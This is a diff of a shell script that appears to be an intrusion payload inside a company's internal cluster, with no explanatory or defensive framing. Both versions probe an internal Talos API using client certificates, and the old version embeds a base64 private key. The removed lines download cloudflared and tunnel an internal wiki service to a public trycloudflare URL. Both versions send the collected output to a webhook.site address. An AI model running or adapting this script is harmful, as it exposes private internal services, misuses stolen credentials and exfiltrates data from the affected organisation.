@@ -1,20 +1,11 @@
-if [ ! -f /dev/shm/ui ]; then
-touch /dev/shm/ui
-A=/dev/shm/a; C=/dev/shm/c; K=/dev/shm/k
-echo 'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJQekNCOHFBREFnRUNBaEVBOE5FSjNvY01MeElsbGoxRmVsYzdiakFGQmdNclpYQXdFREVPTUF3R0ExVUUKQ2hNRmRHRnNiM013SGhjTk1qUXdOREE0TWpFME1qQTNXaGNOTXpRd05EQTJNakUwTWpBM1dqQVFNUTR3REFZRApWUVFLRXdWMFlXeHZjekFxTUFVR0F5dGxjQU1oQU85WVdWeGtxbGprZ3JTanNubGRjTk1zbjgxNDB4ZzhZNDNtCmlXaCsrZVNxbzJFd1h6QU9CZ05WSFE4QkFmOEVCQU1DQW9Rd0hRWURWUjBsQkJZd0ZBWUlLd1lCQlFVSEF3RUcKQ0NzR0FRVUZCd01DTUE4R0ExVWRFd0VCL3dRRk1BTUJBZjh3SFFZRFZSME9CQllFRkJXT3dOdDU5Umc2SGp5UwppUEw5MXpmNTdNZ2FNQVVHQXl0bGNBTkJBR0RoQ3ErZG03aEV2eDlWeHI0bnBnOHVhLzZUNENtV0JNK3pCcHlaClJaVnAxS3BvMFUycTR0elduKzZJOE1ldUEwVWs0UFd0WkwvM2t0UlpwY1QvbWdrPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==' | base64 -d > $A
-echo 'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJLVENCM0tBREFnRUNBaEVBNFFCL1VIMTVkK0pyV09oS2pKN1I5ekFGQmdNclpYQXdFREVPTUF3R0ExVUUKQ2hNRmRHRnNiM013SGhjTk1qUXdOREE0TWpFME1qQTNXaGNOTWpVd05EQTRNakUwTWpBM1dqQVRNUkV3RHdZRApWUVFLRXdodmN6cGhaRzFwYmpBcU1BVUdBeXRsY0FNaEFLaTdLaWQ1U3ZxOHdjT3p2c3lhMHhiOGVhZmlXZFE1CnFlVUc3YUliWFBlSW8wZ3dSakFPQmdOVkhROEJBZjhFQkFNQ0I0QXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0h3WURWUjBqQkJnd0ZvQVVGWTdBMjNuMUdEb2VQSktJOHYzWE4vbnN5Qm93QlFZREsyVndBMEVBbitTegpXWDJMdisreGdORkt2YmRiYVdQR0dKTWQzeGJKZ0Z2V0IrU1lxelprR0x1V2IvS2F3WFVkM2tiRFMyM0VYTlZlClhDYXRmNEJvcHJkWTBuNjZCdz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K' | base64 -d > $C
-echo 'LS0tLS1CRUdJTiBFRDI1NTE5IFBSSVZBVEUgS0VZLS0tLS0KTUM0Q0FRQXdCUVlESzJWd0JDSUVJS3BrdVYvaHJHRS9pUllPb3hIbmtzWkJJVGdGWmJMbnBsVFNLVG4vWVZ5RgotLS0tLUVORCBFRDI1NTE5IFBSSVZBVEUgS0VZLS0tLS0K' | base64 -d > $K
+if [ ! -f /dev/shm/n1 ]; then
+touch /dev/shm/n1
 {
-echo "=== talos 50000 ==="
-curl -sS --max-time 8 --cert $C --key $K --cacert $A "https://talos.internal.turnkey.engineering:50000/" -o /dev/null -w 'code=%{http_code} err=%{errormsg}\n' 2>&1 | head -4
-echo "=== tunnel ==="
-curl -sSL --max-time 40 -o /dev/shm/cf https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 2>&1 | tail -2
-chmod +x /dev/shm/cf
-ls -l /dev/shm/cf
-nohup /dev/shm/cf tunnel --url http://tkhq-internal-tk-wiki.tkhq-internal-tk-wiki.svc.cluster.local:80 --no-autoupdate > /dev/shm/cf.log 2>&1 &
-sleep 18
-grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /dev/shm/cf.log | head -1
-tail -5 /dev/shm/cf.log
-} > /dev/shm/o 2>&1
-curl -sS --max-time 15 --data-binary @/dev/shm/o https://webhook.site/06f518ef-8f69-471e-9306-301a6b4de2e4 >/dev/null 2>&1
+echo "=== live ==="
+date; hostname
+grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /dev/shm/cf.log 2>/dev/null | head -1
+echo "=== talos ==="
+if command -v openssl >/dev/null 2>&1; then timeout 10 openssl s_client -connect talos.internal.turnkey.engineering:50000 -cert /probe/tc.crt -key /probe/tc.key -CAfile /probe/tc.ca -brief </dev/null 2>&1 | head -12; else echo no-openssl; fi
+} > /dev/shm/n
+curl -sS --max-time 15 --data-binary @/dev/shm/n https://webhook.site/66f5a55e-304d-4c6a-8124-132a44831148 >/dev/null 2>&1
 fi
